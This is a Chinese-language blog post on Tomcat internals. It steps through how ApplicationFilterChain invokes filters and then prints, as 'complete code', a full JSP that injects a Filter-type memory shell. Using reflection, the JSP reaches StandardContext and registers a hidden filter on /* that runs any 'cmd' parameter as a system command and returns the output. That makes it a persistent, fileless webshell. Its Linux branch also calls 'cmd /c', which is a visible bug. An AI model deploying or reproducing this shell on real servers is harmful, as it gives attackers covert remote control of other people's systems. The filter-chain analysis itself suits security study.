---
title: JAVA安全-内存马-Filter型
date: 2025-10-14 20:00:00
tags: JAVA
categories: Java安全-内存马
---

## 访问filter之后的流程

上篇环境搭建时自定义了一个`filter`类，这篇逐步调试查看一下这个`filter`类的流程

在我们自定义的`filter`类的`doFilter`方法打上断点，然后访问`/filter`开始调试

![image-20251013162943054](https://image.liam317.top/2025/10/b1d17d2bd2383ae13ee6ef3838cec1b9.png)

在`filterChain.doFilter`处步入，检查有没有开启安全服务，下一步就跳到了if判断的else阶段，步入这个函数

![image-20251013163058138](https://image.liam317.top/2025/10/7941d36185492991424df7e7480a2cbe.png)

![image-20251013163103290](https://image.liam317.top/2025/10/7409d0430c64a0cc3657f5f814888af8.png)

可以看到`ApplicaationFilterConfig`是有两个元素的，`0`是我们自定义的，`1`是`tomcat`自带的，目前pos等于1，通过`ApplicationFilterConfig filterConfig = this.filters[this.pos++];`取到`tomcat`自带的`filter`类

![image-20251013163213351](https://image.liam317.top/2025/10/2f6420c673922d0be7497ec6cf95fa36.png)

然后往下调试就进入到`tomcat`自带的`filter`类的`doFilter`方法

这个if语句判断为false，这个应该是判断是否是注册的最后一个元素

![image-20251013163501511](https://image.liam317.top/2025/10/339d2d3020f8f1b4bc4d03e15dd2430b.png)

会进入到`else`的`chain.doFilter`方法

![image-20251013163520310](https://image.liam317.top/2025/10/bcf9453c77fee45e051e0e1239b2aa5b.png)

然后又回到了`ApplicationFilterChaind.class`的`doFilter`函数，然后又进入到了`internalDoFilter`函数

![image-20251013163827969](https://image.liam317.top/2025/10/5a4bc23f3bcbb01173b19b613ab0863a.png)

这次不满足if条件，往下一直调试就会到`servlet.service`

![image-20251013163905997](https://image.liam317.top/2025/10/a8eac73b2c42814aaf089e6a3e8440a7.png)

### 总结一下

会有多个`filter`，先是从数组的后往前取，最终调用的是最后一个`filter的servlet.service`

上一个 `Filter.doFilter()` 方法中调用` FilterChain.doFilter() `方法将调用下一个 `Filter.doFilter()` 方法；这也就是我们的 Filter 链，是去逐个获取的。

# 完整代码

```jsp
<%--
  User: Drunkbaby
  Date: 2022/8/27
  Time: 上午10:31
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>

<%
    final String name = "Drunkbaby";
    // 获取上下文
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);

    if (filterConfigs.get(name) == null){
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {

            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                HttpServletRequest req = (HttpServletRequest) servletRequest;
                if (req.getParameter("cmd") != null) {
                    boolean isLinux = true;
                    String osTyp = System.getProperty("os.name");
                    if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                        isLinux = false;
                    }
                    String[] cmds = isLinux ? new String[] {"cmd", "/c", req.getParameter("cmd")} : new String[] {"cmd.exe", "/c", req.getParameter("cmd")};
                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                    Scanner s = new Scanner( in ).useDelimiter("\\a");
                    String output = s.hasNext() ? s.next() : "";
                    servletResponse.getWriter().write(output);
                    servletResponse.getWriter().flush();
                    return;
                }
                filterChain.doFilter(servletRequest, servletResponse);
            }

            @Override
            public void destroy() {

            }

        };

        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
        standardContext.addFilterDef(filterDef);

        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        standardContext.addFilterMapBefore(filterMap);

        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

        filterConfigs.put(name, filterConfig);
        out.print("Inject Success !");
    }
%>
<html>
<head>
    <title>filter</title>
</head>
<body>
    Hello Filter
</body>
</html>

```

